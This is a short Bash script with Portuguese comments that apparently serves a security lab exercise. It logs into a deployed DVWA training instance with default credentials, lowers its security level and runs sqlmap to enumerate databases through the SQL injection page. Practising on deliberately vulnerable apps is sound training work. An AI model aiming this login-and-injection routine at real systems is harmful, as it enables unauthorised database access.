#!/bin/bash

# Play 03 — SQLMap DVWA em produção
# Autentica no DVWA e roda sqlmap corretamente

# Define host DVWA (sem porta)
TARGET_HOST="${DVWA_HOST:-web-dvwa-production.up.railway.app}"

# Diretório do script para referência
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

# Cookie file para manter sessão autenticada
COOKIE_FILE="$SCRIPT_DIR/cookies.txt"

# URLs de login e security
LOGIN_URL="http://$TARGET_HOST/login.php"
SECURITY_URL="http://$TARGET_HOST/security.php?security=low"
INJECTION_URL="http://$TARGET_HOST/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit"

# 1. Autentica no DVWA como admin/password
echo "[*] Autenticando no DVWA em $LOGIN_URL..."
curl -s -c "$COOKIE_FILE" \
  -d "username=admin&password=password&Login=Login" \
  "$LOGIN_URL" > /dev/null

# 2. Define nível de segurança para low
echo "[*] Definindo segurança para LOW..."
curl -s -b "$COOKIE_FILE" "$SECURITY_URL" > /dev/null

# 3. Inicia análise SQL Injection
echo "[*] Iniciando análise SQL Injection com sqlmap contra $INJECTION_URL..."
sqlmap \
  -u "$INJECTION_URL" \
  --cookie-file="$COOKIE_FILE" \
  --batch \
  --level=3 \
  --risk=2 \
  --dbs

# Finaliza
echo "[✓] Análise SQLi concluída."
